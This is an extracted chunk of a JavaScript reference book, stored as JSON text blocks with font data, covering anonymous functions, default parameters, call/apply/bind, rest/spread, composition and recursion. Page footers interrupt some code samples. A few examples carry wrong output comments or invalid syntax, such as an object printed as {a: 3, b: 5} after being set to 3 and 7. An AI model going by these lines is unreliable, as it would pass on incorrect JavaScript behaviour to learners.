        "text": "Some functions may accept a reference to a function as a parameter. These are sometimes referred to as \"dependency injections\" or \"callbacks\", because it allows the function your calling to \"call back\" to your code, giving you an opportunity to change the way the called function behaves. For example, the Array object's map function allows you to iterate over each element of an array, then build a new array by applying a transform function to each element.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  nums  =   [ 0 , 1 , 2 ]; var  doubledNums  =  nums. map (   function ( element ){   return  element  *   2 ;   }   );   // [0,2,4]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It would be tedious, sloppy and unnecessary to create a named function, which would clutter your scope with a function only needed in this one place and break the natural \ufb02ow and reading of your code (a colleague would have to leave this code to \ufb01nd your function to understand what's going on).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Returning an Anonymous Function From Another Function",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Sometimes it's useful to return a function as the result of another function. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  hash  =  getHashFunction (   'sha1'   );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 173",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  hashValue  =  hash (   'Secret Value'   ); function  getHashFunction (  algorithm  ){      if   (  algorithm  ===   'sha1'   )   return   function (  value  ){   /*...*/   };      else   if   (  algorithm  ===   'md5'   )   return   function (  value  ){   /*...*/   }; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Immediately Invoking an Anonymous Function",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Unlike many other languages, scoping in JavaScript is function-level, not block-level. (See Function Scoping ). In some cases, however, it's necessary to create a new scope. For example, it's common to create a new scope when adding code via a  <script>  tag, rather than allowing variable names to be de\ufb01ned in the global scope (which runs the risk of other scripts colliding with your variable names). A common method to handle this situation is to de\ufb01ne a new anonymous function and then immediately invoke it, safely hiding you variables within the scope of the anonymous function and without making your code accessible to third-parties via a leaked function name. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<!-- My Script -- >",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "<script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function initialize (){     // foo is safely hidden within initialize, but...     var foo =  '' ; } // ...my initialize function is now accessible from global scope. // There is a risk someone could call it again, probably by accident. initialize () ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "</script> <script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Using an anonymous function, and then immediately // invoking it, hides my foo variable and guarantees // no one else can call it a second time. ( function (){     var foo =  '' ; }())  // <--- the parentheses invokes the function immediately",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "</script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Self-Referential Anonymous Functions",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Sometimes it's useful for an anonymous function to be able to refer to itself. For example, the function may need to recursively call itself or add properties to itself. If the function is anonymous, though, this can be very di\ufb03cult as it requires knowledge of the variable that the function has been assigned to. This is the less than ideal solution:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  foo  =   function ( callAgain ){     console. log (   'Whassup?'   );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Less than ideal... we're dependent on a variable reference...",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if   ( callAgain  ===   true )  foo ( false ); }; foo ( true );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Console Output: // Whassup? // Whassup? // Assign bar to the original function, and assign foo to another function.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  bar  =  foo ; foo  =   function (){",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 174",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    console. log ( 'Bad.' ) }; bar ( true );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Console Output: // Whassup? // Bad.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The intent here was for the anonymous function to recursively call itself, but when the value of foo changes, you end up with a potentially di\ufb03cult to trace bug. Instead, we can give the anonymous function a reference to itself by giving it a private name, like so:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  foo  =   function  myself ( callAgain ){     console. log (   'Whassup?'   );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Less than ideal... we're dependent on a variable reference...",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if   ( callAgain  ===   true )  myself ( false ); }; foo ( true );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Console Output: // Whassup? // Whassup? // Assign bar to the original function, and assign foo to another function.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  bar  =  foo ; foo  =   function (){     console. log ( 'Bad.' ) }; bar ( true );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Console Output: // Whassup? // Whassup?",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that the function name is scoped to itself. The name has not leaked into the outer scope:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "myself ( false );   // ReferenceError: myself is not defined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This technique is especially useful when dealing with recursive anonymous functions as callback parameters:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "// Calculate the Fibonacci value for each number in an array:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  fib  =   false ,",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    result  =   [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 ] . map (          function  fib ( n ){              return   (  n  <=   2   )   ?   1   :  fib (  n  -   1   )   +  fib (  n  -   2   );          });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// result = [1, 1, 2, 3, 5, 8, 13, 21] // fib = false (the anonymous function name did not overwrite our fib variable)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 19.8: Default parameters",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Before ECMAScript 2015 (ES6), a parameter's default value could be assigned in the following way:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  printMsg ( msg )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 175",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  msg  =   typeof  msg  !==   'undefined'   ?   // if a value was provided",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        msg  :                          // then, use that value in the reassignment",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         'Default value for msg.' ;      // else, assign a default value   console. log ( msg ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "ES6 provided a new syntax where the condition and reassignment depicted above is no longer necessary:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "function  printMsg ( msg = 'Default value for msg.' )   {     console. log ( msg ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "printMsg ();   // -> \"Default value for msg.\" printMsg ( undefined );   // -> \"Default value for msg.\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "printMsg ( 'Now my msg in different!' );   // -> \"Now my msg in different!\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This also shows that if a parameter is missing when the function is invoked, its value is kept as  undefined , as it can be con\ufb01rmed by explicitly providing it in the following example (using an arrow function):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "let  param_check  =   ( p  =   'str' )   =>  console. log ( p  +   ' is of type: '   +   typeof  p );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "param_check ();   // -> \"str is of type: string\" param_check ( undefined );   // -> \"str is of type: string\" param_check ( 1 );   // -> \"1 is of type: number\" param_check ( this );   // -> \"[object Window] is of type: object\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Functions/variables as default values and reusing parameters",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The default parameters' values are not restricted to numbers, strings or simple objects. A function can also be set as the default value  callback  =   function (){} :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "function  foo ( callback  =   function (){  console. log ( 'default' );   })   {     callback (); } foo ( function   (){     console. log ( 'custom' ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// custom",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "foo ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//default",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "There are certain characteristics of the operations that can be performed through default values: A previously declared parameter can be reused as a default value for the upcoming parameters' values. Inline operations are allowed when assigning a default value to a parameter. Variables existing in the same scope of the function being declared can be used in its default values. Functions can be invoked in order to provide their return value into a default value.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "let  zero  =   0 ; function  multiply ( x )   {   return  x  *   2 ;} function  add ( a  =   1   +  zero ,  b  =  a ,  c  =  b  +  a ,  d  =  multiply ( c ))   {     console. log (( a  +  b  +  c ),  d );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 176 }",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "add ( 1 );                  // 4, 4 add ( 3 );                  // 12, 12 add ( 2 ,   7 );               // 18, 18 add ( 1 ,   2 ,   5 );            // 8, 10 add ( 1 ,   2 ,   5 ,   10 );        // 8, 20",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Reusing the function's return value in a new invocation's default value:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "let  array  =   [ 1 ];   // meaningless: this will be overshadowed in the function's scope",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  add ( value ,  array  =   [])   {   array. push ( value );    return  array ; } add ( 5 );           // [5]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "add ( 6 );           // [6], not [5, 6]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "add ( 6 ,  add ( 5 ));   // [5, 6]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "arguments  value and length when lacking parameters in invocation",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The  arguments  array object only retains the parameters whose values are not default, i.e. those that are explicitly provided when the function is invoked:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "function  foo ( a  =   1 ,  b  =  a  +   1 )   {     console. info ( arguments. length ,  arguments );     console. log ( a , b ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "foo ();          // info: 0 >> []     | log: 1, 2 foo ( 4 );         // info: 1 >> [4]    | log: 4, 5 foo ( 5 ,   6 );      // info: 2 >> [5, 6] | log: 5, 6",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 19.9: Call and apply",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Functions have two built-in methods that allow the programmer to supply arguments and the  this  variable di\ufb00erently:  call  and  apply . This is useful, because functions that operate on one object (the object that they are a property of) can be repurposed to operate on another, compatible object. Additionally, arguments can be given in one shot as arrays, similar to the spread ( ... ) operator in ES6.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  obj  =   {     a :   1 ,     b :   2 ,      set :   function   ( a ,  b )   {          this . a   =  a ;          this . b   =  b ;      } };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "obj. set ( 3 ,   7 );   // normal syntax obj. set . call ( obj ,   3 ,   7 );   // equivalent to the above obj. set . apply ( obj ,   [ 3 ,   7 ]);   // equivalent to the above; note that an array is used console. log ( obj );   // prints { a: 3, b: 5 }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  myObj  =   {};",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "myObj. set ( 5 ,   4 );   // fails; myObj has no `set` property",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 177",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "obj. set . call ( myObj ,   5 ,   4 );   // success; `this` in set() is re-routed to myObj instead of obj obj. set . apply ( myObj ,   [ 5 ,   4 ]);   // same as above; note the array console. log ( myObj );   // prints { a: 3, b: 5 }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "ECMAScript 5 introduced another method called  bind ()  in addition to  call ()  and  apply ()  to explicitly set  this value of the function to speci\ufb01c object. It behaves quite di\ufb00erently than the other two. The \ufb01rst argument to  bind ()  is the  this  value for the new function. All other arguments represent named parameters that should be permanently set in the new function.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  showName ( label )   {     console. log ( label  +   \":\"   +   this . name ); } var  student1  =   {      name :   \"Ravi\" }; var  student2  =   {      name :   \"Vinod\" };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// create a function just for student1",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  showNameStudent1  =  showName. bind ( student1 ); showNameStudent1 ( \"student1\" );   // outputs \"student1:Ravi\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// create a function just for student2",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  showNameStudent2  =  showName. bind ( student2 ,   \"student2\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "showNameStudent2 ();   // outputs \"student2:Vinod\" // attaching a method to an object doesn't change `this` value of that method.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "student2. sayName   =  showNameStudent1 ; student2. sayName ( \"student2\" );   // outputs \"student2:Ravi\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 19.10: Partial Application",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Similar to currying, partial application is used to reduce the number of arguments passed to a function. Unlike currying, the number need not go down by one. Example: This function ...",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  multiplyThenAdd ( a ,  b ,  c )   {      return  a  *  b  +  c ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "... can be used to create another function that will always multiply by 2 and then add 10 to the passed value;",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  reversedMultiplyThenAdd ( c ,  b ,  a )   {      return  a  *  b  +  c ; } function  factory ( b ,  c )   {      return  reversedMultiplyThenAdd. bind ( null ,  c ,  b ); } var  multiplyTwoThenAddTen  =  factory ( 2 ,   10 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 178",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "multiplyTwoThenAddTen ( 10 );   // 30",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The \"application\" part of partial application simply means \ufb01xing parameters of a function.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.11: Passing arguments by reference or value",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In JavaScript all arguments are passed by value. When a function assigns a new value to an argument variable, that change will not be visible to the caller:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   { a :   2 }; function  myfunc ( arg ){",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    arg  =   { a :   5 };   // Note the assignment is to the parameter variable itself }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "myfunc ( obj ); console. log ( obj. a );   // 2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "However, changes made to (nested) properties  of  such arguments, will be visible to the caller:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   { a :   2 }; function  myfunc ( arg ){",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    arg. a   =   5 ;   // assignment to a property of the argument }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "myfunc ( obj ); console. log ( obj. a );   // 5",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This can be seen as a  call by reference : although a function cannot change the caller's object by assigning a new value to it, it could  mutate  the caller's object. As primitive valued arguments, like numbers or strings, are immutable, there is no way for a function to mutate them:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  s  =   'say' ; function  myfunc ( arg ){",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    arg  +=   ' hello' ;   // assignment to the parameter variable itself }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "myfunc ( s ); console. log ( s );   // 'say'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When a function wants to mutate an object passed as argument, but does not want to actually mutate the caller's object, the argument variable should be reassigned:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  obj  =   { a :   2 ,  b :   3 }; function  myfunc ( arg ){",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    arg  =  Object. assign ({},  arg );   // assignment to argument variable, shallow copy",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    arg. a   =   5 ; } myfunc ( obj ); console. log ( obj. a );   // 2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "As an alternative to in-place mutation of an argument, functions can create a new value, based on the argument, and return it. The caller can then assign it, even to the original variable that was passed as argument:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   2 ; function  myfunc ( arg ){     arg ++;      return  arg ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 179 }",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  =  myfunc ( a ); console. log ( obj. a );   // 3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 19.12: Function Arguments, \"arguments\" object, rest and spread parameters",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Functions can take inputs in form of variables that can be used and assigned inside their own scope. The following function takes two numeric values and returns their sum:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  addition  ( argument1 ,  argument2 ){      return  argument1  +  argument2 ; } console. log ( addition ( 2 ,   3 ));   // -> 5",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "arguments  object",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  arguments  object contains all the function's parameters that contain a non-default value. It can also be used even if the parameters are not explicitly declared:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( function ()   {  console. log ( arguments )   })( 0 , 'str' ,   [ 2 ,{ 3 }])   // -> [0, \"str\", Array[2]]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Although when printing  arguments  the output resembles an Array, it is in fact an object:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( function ()   {  console. log ( typeof  arguments )   })();   // -> object",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Rest parameters:  function   ( ... parm )   {}",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In ES6, the  ...  syntax when used in the declaration of a function's parameters transforms the variable to its right into a single object containing all the remaining parameters provided after the declared ones. This allows the function to be invoked with an unlimited number of arguments, which will become part of this variable:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( function ( a ,  ... b ){ console. log ( typeof  b + ': ' + b [ 0 ]+ b [ 1 ]+ b [ 2 ])   })( 0 , 1 , '2' ,[ 3 ],{ i : 4 });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// -> object: 123  ",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Spread parameters:  function_name ( ... varb );",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In ES6, the  ...  syntax can also be used when invoking a function by placing an object/variable to its right. This allows that object's elements to be passed into that function as a single object:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  nums  =   [ 2 , 42 ,- 1 ]; console. log ( ... [ 'a' , 'b' , 'c' ],  Math. max ( ... nums ));   // -> a b c 42",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 19.13: Function Composition",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Composing multiple functions into one is a functional programming common practice; composition makes a pipeline through which our data will transit and get modi\ufb01ed simply working on the function- composition (just like snapping pieces of a track together)... you start out with some single responsibility functions:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "  const  capitalize  =  x  =>  x. replace ( /^\\w/ ,  m  =>  m. toUpperCase ());   const  sign  =  x  =>  x  +   ', \\n made with love' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 180",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "and easily create a transformation track:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "  const  formatText  =  compose ( capitalize ,  sign );  formatText ( 'this is an example' )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  //This is an example,   //made with love",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "N.B. Composition is achieved through a utility function usually called  compose  as in our example. Implementation of  compose  are present in many JavaScript utility libraries ( lodash ,  rambda , etc.) but you can also start out with a simple implementation such as:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "  const  compose  =   ( ... funs )   =>    x  =>    funs. reduce (( ac ,  f )   =>  f ( ac ),  x );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 19.14: Get the name of a function object",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "ES6 :",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "myFunction. name",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Explanation on MDN . As of 2015 works in Node.js and all major browsers except IE.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "ES5 :",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "If you have a reference to the function, you can do:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  functionName (  func  ) {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Match:      // - ^          the beginning of the string      // - function   the word 'function'      // - \\s+        at least some white space      // - ([\\w\\$]+)  capture one or more valid JavaScript identifier characters      // - \\(         followed by an opening brace",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     //      var  result  =   /^function\\s+([\\w\\$]+)\\(/ . exec (  func. toString ()   )          return  result  ?  result [ 1 ]   :   '' }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 19.15: Recursive Function",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A recursive function is simply a function, that would call itself.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  factorial  ( n )   {      if   ( n  <=   1 )   {          return   1 ;      }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 181    ",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     return  n  *  factorial ( n  -   1 ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The above function shows a basic example of how to perform a recursive function to return a factorial. Another example, would be to retrieve the sum of even numbers in an array.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  countEvenNumbers  ( arr )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Sentinel value.  Recursion stops on empty array.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if   ( arr. length   <   1 )   {          return   0 ;      }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // The shift() method removes the first element from an array      // and returns that element. This method changes the length of the array.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  value  =  arr. shift ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
